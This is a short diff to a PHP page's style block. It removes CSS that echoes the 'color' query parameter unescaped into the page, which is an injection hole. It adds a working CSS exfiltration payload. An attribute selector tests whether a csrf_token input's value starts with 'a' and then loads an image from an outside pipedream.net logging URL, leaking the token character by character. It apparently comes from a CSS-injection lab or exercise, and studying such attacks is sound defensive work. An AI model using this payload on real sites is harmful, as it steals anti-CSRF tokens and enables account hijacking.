@@ -1,15 +1,5 @@
 <style>
-body {
-  background-color: lightblue;
-}
-<?php echo "okkkkkkkkkkkkkkkkkokokokookk";?>
-
-p {
-    color: <?php echo $_GET['color']; ?>;
-    text-align: center;
-}
-body {
-  text: center;
-  color: <?php echo "testststttstst";?>;
+input[name=csrf_token][value=^a] {
+    background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/log?a);
 }
 </style>
